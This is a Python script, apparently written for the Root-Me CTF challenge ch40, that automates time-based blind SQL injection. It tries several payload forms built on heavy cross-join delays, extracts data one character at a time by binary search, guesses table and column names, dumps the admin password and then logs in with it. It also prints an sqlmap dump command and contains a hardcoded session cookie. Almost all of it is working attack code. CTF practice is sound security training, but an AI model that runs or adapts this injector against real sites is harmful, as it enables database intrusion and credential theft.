#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN FINAL - TODAS LAS TÉCNICAS
"""
import requests
import time
import statistics
import json
from datetime import datetime

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.heavy = "(SELECT COUNT(*) FROM users, users T1, users T2)"
        self.results = {}
        self.log_entries = []
        self.debug = False
        self.technique = "case"  # case, if, and, or
        
    def log(self, msg, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        entry = f"[{timestamp}] [{level}] {msg}"
        print(entry)
        self.log_entries.append(entry)
    
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true_case(self, condition, repeats=3):
        """Técnica 1: CASE WHEN condition THEN heavy ELSE 0 END"""
        payload = f"1 AND (CASE WHEN {condition} THEN {self.heavy} ELSE 0 END)"
        t = self.test_payload(payload, repeats=repeats)
        return t > self.threshold
    
    def is_true_if(self, condition, repeats=3):
        """Técnica 2: IF(condition, heavy, 0)"""
        payload = f"1 AND IF({condition}, {self.heavy}, 0)"
        t = self.test_payload(payload, repeats=repeats)
        return t > self.threshold
    
    def is_true_and(self, condition, repeats=3):
        """Técnica 3: condition AND heavy (cortocircuito)"""
        payload = f"1 AND ({condition}) AND {self.heavy}"
        t = self.test_payload(payload, repeats=repeats)
        return t > self.threshold
    
    def is_true_or(self, condition, repeats=3):
        """Técnica 4: OR con lazy evaluation (invertido)"""
        # Si condition es TRUE, el OR corta y NO ejecuta heavy
        # Si condition es FALSE, se ejecuta heavy
        payload = f"1 OR ({condition}) OR {self.heavy}"
        t = self.test_payload(payload, repeats=repeats)
        return t < self.threshold  # Invertido: TRUE -> rápido, FALSE -> lento
    
    def is_true(self, condition, repeats=3):
        """Evalúa condición usando la técnica seleccionada"""
        if self.technique == "case":
            return self.is_true_case(condition, repeats)
        elif self.technique == "if":
            return self.is_true_if(condition, repeats)
        elif self.technique == "and":
            return self.is_true_and(condition, repeats)
        elif self.technique == "or":
            return self.is_true_or(condition, repeats)
        else:
            return self.is_true_case(condition, repeats)
    
    def extract_char(self, query, pos):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
            if self.is_true(cond, repeats=2):
                low = mid + 1
            else:
                high = mid - 1
        return chr(low)
    
    def extract_string(self, query, label="Extrayendo", max_len=50):
        self.log(f"{label}...")
        result = ""
        for pos in range(1, max_len + 1):
            char = self.extract_char(query, pos)
            result += char
            self.log(f"  [{pos}] '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:
                break
        return result
    
    def test_technique(self, technique_name):
        """Prueba una técnica específica"""
        self.log(f"\n{'='*60}")
        self.log(f"  Probando técnica: {technique_name}")
        self.log(f"{'='*60}")
        
        self.technique = technique_name
        
        # Probar condiciones básicas
        tests = [
            ("1=1", "TRUE simple"),
            ("1=2", "FALSE simple"),
            ("'1'='1'", "TRUE comillas"),
            ("'1'='2'", "FALSE comillas"),
            ("ASCII('a')=97", "TRUE ASCII"),
            ("ASCII('a')=98", "FALSE ASCII"),
        ]
        
        success = True
        for cond, desc in tests:
            result = self.is_true(cond, repeats=2)
            self.log(f"  {desc}: {result}")
            # Si 1=2 es TRUE, la técnica no funciona
            if cond == "1=2" and result == True:
                success = False
                self.log(f"  ❌ Técnica {technique_name} NO funciona (1=2 es TRUE)")
                break
        
        if success:
            self.log(f"  ✅ Técnica {technique_name} funciona correctamente")
            return True
        return False
    
    def find_best_technique(self):
        """Encuentra la mejor técnica probando todas"""
        self.log("\n" + "="*70)
        self.log("  BUSCANDO LA MEJOR TÉCNICA")
        self.log("="*70)
        
        techniques = ["case", "if", "and", "or"]
        
        for tech in techniques:
            if self.test_technique(tech):
                self.technique = tech
                self.log(f"\n[+] Técnica seleccionada: {tech}")
                return tech
        
        self.log("\n[!] Ninguna técnica funciona correctamente")
        self.log("[!] Probando con heavy query más pesada...")
        
        # Intentar con heavy query más pesada
        self.heavy = "(SELECT COUNT(*) FROM users, users T1, users T2, users T3)"
        
        for tech in techniques:
            if self.test_technique(tech):
                self.technique = tech
                self.log(f"\n[+] Técnica seleccionada: {tech} (con heavy query pesada)")
                return tech
        
        return None
    
    def extract_database_info(self):
        """Extrae toda la información de la base de datos"""
        self.log("\n" + "="*70)
        self.log("  EXTRACCIÓN DE INFORMACIÓN")
        self.log("="*70)
        
        # 1. Versión
        version = self.extract_string("SELECT VERSION()", "Versión de MySQL")
        if version:
            self.results["version"] = version
            self.log(f"\n[+] Versión: {version}")
        
        # 2. Base de datos
        db = self.extract_string("SELECT DATABASE()", "Base de datos")
        if db:
            self.results["database"] = db
            self.log(f"\n[+] Base de datos: {db}")
        
        # 3. Usuario
        user = self.extract_string("SELECT USER()", "Usuario")
        if user:
            self.results["user"] = user
            self.log(f"\n[+] Usuario: {user}")
        
        # 4. Tablas
        self.log("\n[*] Buscando tablas...")
        tablas = ['usuarios', 'users', 'member', 'members', 'admin', 'administradores']
        encontradas = []
        
        for tabla in tablas:
            if self.is_true(f"EXISTS(SELECT * FROM {tabla})", repeats=2):
                self.log(f"  [+] Tabla encontrada: {tabla}")
                encontradas.append(tabla)
            else:
                self.log(f"  [-] Tabla no encontrada: {tabla}")
        
        self.results["tables"] = encontradas
        
        if encontradas:
            tabla = encontradas[0]
            self.log(f"\n[*] Buscando columnas en {tabla}...")
            
            columnas = ['username', 'user', 'login', 'name', 'admin', 'usuario']
            col_user = None
            for col in columnas:
                if self.is_true(f"EXISTS(SELECT {col} FROM {tabla})", repeats=2):
                    self.log(f"  [+] Columna usuario: {col}")
                    col_user = col
                    break
            
            columnas_pass = ['password', 'pass', 'clave', 'contrasena', 'pwd', 'pw']
            col_pass = None
            for col in columnas_pass:
                if self.is_true(f"EXISTS(SELECT {col} FROM {tabla})", repeats=2):
                    self.log(f"  [+] Columna contraseña: {col}")
                    col_pass = col
                    break
            
            if col_user and col_pass:
                query = f"SELECT {col_pass} FROM {tabla} WHERE {col_user}='admin'"
                password = self.extract_string(query, "Contraseña del admin")
                if password:
                    self.results["password"] = password
                    self.log(f"\n[+] CONTRASEÑA: {password}")
                    
                    # Verificar credenciales
                    self.log("\n[*] Verificando credenciales...")
                    data = {"username": "admin", "password": password}
                    r = requests.post(URL + "?action=login", data=data, cookies=self.session.cookies)
                    if "Authentification error" not in r.text:
                        self.log("[+] ✅ ¡CREDENCIALES CORRECTAS!")
                        self.log(f"    Usuario: admin")
                        self.log(f"    Contraseña: {password}")
                    else:
                        self.log("[-] ❌ Las credenciales no funcionan")
    
    def save_results(self):
        """Guarda los resultados en JSON"""
        data = {
            "timestamp": datetime.now().isoformat(),
            "url": URL,
            "technique": self.technique,
            "baseline": self.baseline,
            "threshold": self.threshold,
            "heavy": self.heavy,
            "results": self.results,
            "log": self.log_entries
        }
        with open("sql_injection_results.json", "w") as f:
            json.dump(data, f, indent=2)
        self.log(f"\n[+] Resultados guardados en sql_injection_results.json")

# EJECUCIÓN PRINCIPAL
injector = TimeBasedSQLInjector()

print("="*70)
print("  SQL INJECTION TIME-BASED - ROOT-ME CH40")
print("  VERSIÓN FINAL - TODAS LAS TÉCNICAS")
print("="*70)

# 1. Encontrar la mejor técnica
best_technique = injector.find_best_technique()

if best_technique:
    # 2. Extraer información
    injector.extract_database_info()
    
    # 3. Guardar resultados
    injector.save_results()
    
    # 4. Resumen final
    print("\n" + "="*70)
    print("  RESUMEN FINAL")
    print("="*70)
    print(f"Técnica usada: {injector.technique}")
    print(f"Heavy query: {injector.heavy}")
    print(f"\nResultados:")
    for key, value in injector.results.items():
        if key != "tables":
            print(f"  {key}: {value}")
    if "tables" in injector.results:
        print(f"  tables: {', '.join(injector.results['tables'])}")
else:
    print("\n[!] No se encontró ninguna técnica que funcione")
    print("[!] Probando con sqlmap...")
    print("\nEjecuta:")
    print('sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" \\')
    print('       --cookie="PHPSESSID=fbf0fdc633505f66eef3f20808f0d1ce" \\')
    print('       --level=5 --risk=3 --batch \\')
    print('       --technique=BEUSTQ --time-sec=10 --dump')
